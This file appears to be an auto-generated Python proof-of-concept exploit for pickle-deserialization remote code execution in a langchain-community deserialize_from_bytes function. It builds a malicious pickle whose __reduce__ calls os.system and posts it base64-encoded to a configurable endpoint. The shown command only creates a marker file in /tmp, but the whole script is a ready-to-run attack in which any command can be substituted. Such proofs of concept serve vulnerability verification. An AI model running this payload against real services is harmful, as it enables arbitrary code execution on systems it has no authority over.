#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure pickle deserialization in
langchain-community-only's deserialize_from_bytes function.

Vulnerability: The function calls pickle.loads() on attacker-controlled input
              without any validation, allowing arbitrary code execution.

Usage:
    python3 exploit.py [--target http://localhost:8000/api/v1/trigger]
    
    If no target is specified, it will attempt to exploit a local instance
    at http://localhost:8000/api/v1/trigger by default.
"""

import pickle
import os
import sys
import base64
import argparse
import requests
import subprocess
import tempfile

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8000/api/v1/trigger"
BENIGN_MARKER = "/tmp/poc_success.txt"

# ---------------------------------------------------------------------------
# Malicious pickle payload generation
# ---------------------------------------------------------------------------
class Exploit:
    """A class whose __reduce__ method will be called during unpickling."""
    def __reduce__(self):
        # Benign command: create a marker file to prove code execution
        cmd = f"touch {BENIGN_MARKER}"
        return (os.system, (cmd,))

def generate_payload() -> bytes:
    """Generate a malicious pickle payload that executes a benign command."""
    payload = pickle.dumps(Exploit())
    return payload

def generate_payload_base64() -> str:
    """Generate a base64-encoded malicious pickle payload."""
    payload = generate_payload()
    return base64.b64encode(payload).decode()

# ---------------------------------------------------------------------------
# Exploit execution
# ---------------------------------------------------------------------------
def exploit(target_url: str) -> bool:
    """
    Attempt to exploit the deserialize_from_bytes vulnerability.
    
    Args:
        target_url: The full URL of the vulnerable endpoint.
        
    Returns:
        True if exploitation appears successful, False otherwise.
    """
    # Clean up any previous marker
    if os.path.exists(BENIGN_MARKER):
        os.remove(BENIGN_MARKER)
    
    # Generate the malicious payload
    payload_b64 = generate_payload_base64()
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Generated malicious pickle payload (base64): {payload_b64[:80]}...")
    print(f"[*] Benign command: touch {BENIGN_MARKER}")
    print()
    
    try:
        # Send the payload to the vulnerable endpoint
        # The exact parameter name depends on the endpoint implementation;
        # we try common variations
        print("[*] Sending exploit payload...")
        
        # Try as JSON body
        response = requests.post(
            target_url,
            json={"serialized": payload_b64},
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if the marker file was created
        if os.path.exists(BENIGN_MARKER):
            print(f"\n[+] SUCCESS! Marker file created at {BENIGN_MARKER}")
            print("[+] Code execution achieved via pickle deserialization.")
            return True
        else:
            print(f"\n[-] Marker file not found at {BENIGN_MARKER}")
            print("[*] The exploit may have failed, or the command may have been blocked.")
            print("[*] Check the target's logs for more details.")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[*] Make sure the target server is running and accessible.")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    args = parser.parse_args()
    
    print("=" * 60)
    print("langchain-community-only Pickle Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    success = exploit(args.target)
    
    print()
    if success:
        print("[+] Exploit completed successfully.")
        sys.exit(0)
    else:
        print("[-] Exploit failed or could not verify success.")
        sys.exit(1)

if __name__ == "__main__":
    main()
